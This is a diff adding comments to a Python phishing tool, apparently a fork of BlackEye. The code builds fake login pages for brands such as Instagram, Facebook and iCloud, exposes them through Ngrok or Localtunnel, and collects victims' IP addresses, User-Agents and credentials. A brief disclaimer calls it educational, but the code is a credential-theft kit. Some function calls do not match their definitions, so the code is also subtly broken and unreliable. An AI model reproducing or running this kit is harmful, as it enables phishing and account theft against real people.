@@ -6,26 +6,31 @@ import time
 import webbrowser
 
 def open_page():
+    # Open the GitHub page
     url = "https://github.com/amir13872"
     webbrowser.open(url)
 
 def start_server(server):
+    # Start the server for the specified service
     print(f"Starting server for: {server}")
     start(server)
 
 def stop():
+    # Stop any running PHP or Node.js processes
     os.system("pkill -f -2 php")
     os.system("killall -2 php")
     os.system("pkill -f -2 node")
     os.system("killall -2 node")
 
 def banner():
+    # Print the disclaimer banner
     print(":: Disclaimer: Developers assume no liability and are not    ::")
     print(":: responsible for any misuse or damage caused by BlackEye.  ::")
     print(":: Only use for educational purposes!!                      ::")
     print("::     BLACKEYE By @EricksonAtHome and forked by @amir13872  ::")
 
 def create_page():
+    # Create a custom phishing page
     default_cap1 = "Wi-fi Session Expired"
     default_cap2 = "Please login again."
     default_user_text = "Username:"
@@ -49,6 +54,7 @@ def create_page():
         f.write(f"</center>\n<body>\n</html>\n")
 
 def catch_cred(server):
+    # Catch and display the credentials
     with open(f"sites/{server}/usernames.txt") as f:
         lines = f.readlines()
         account = lines[0].split(" ")[1]
@@ -61,6 +67,7 @@ def catch_cred(server):
     stop()
 
 def get_credentials(server):
+    # Wait for credentials to be captured
     print("Waiting for credentials ...")
     while True:
         if os.path.exists(f"sites/{server}/usernames.txt"):
@@ -69,6 +76,7 @@ def get_credentials(server):
         time.sleep(1)
 
 def catch_ip(server):
+    # Catch and display the IP address and User-Agent
     with open(f"sites/{server}/ip.txt") as f:
         lines = f.readlines()
         ip = lines[0].split(" ")[1].strip()
@@ -81,6 +89,7 @@ def catch_ip(server):
     get_credentials(server)
 
 def start():
+    # Choose the tunneling method
     print("1. Localtunnel")
     print("2. Ngrok")
     host = input("Choose the tunneling method: ")
@@ -90,6 +99,7 @@ def start():
         start_ngrok()
 
 def start_localtunnel(server):
+    # Start the Localtunnel server
     os.system(f"rm -rf sites/{server}/ip.txt")
     os.system(f"rm -rf sites/{server}/usernames.txt")
     print("Starting php server...")
@@ -104,6 +114,7 @@ def start_localtunnel(server):
     check_found(server)
 
 def start_ngrok(server):
+    # Start the Ngrok server
     os.system(f"rm -rf sites/{server}/ip.txt")
     os.system(f"rm -rf sites/{server}/usernames.txt")
     print("Starting php server...")
@@ -119,6 +130,7 @@ def start_ngrok(server):
     check_found(server)
 
 def check_found(server):
+    # Wait for the victim to open the link
     print("Waiting for victim to open the link ...")
     while True:
         if os.path.exists(f"sites/{server}/ip.txt"):
@@ -127,6 +139,7 @@ def check_found(server):
         time.sleep(1)
 
 def menu():
+    # Display the menu options
     print("[01] Instagram      [17] DropBox        [33] eBay")
     print("[02] Facebook       [18] Line           [34] Amazon")
     print("[03] Snapchat       [19] Shopify        [35] iCloud")
@@ -238,6 +251,7 @@ def menu():
         menu()
 
 if __name__ == "__main__":
+    # Handle SIGINT signal to stop the server
     signal.signal(signal.SIGINT, lambda sig, frame: (print("\n"), stop(), sys.exit(1)))
     banner()
     menu()
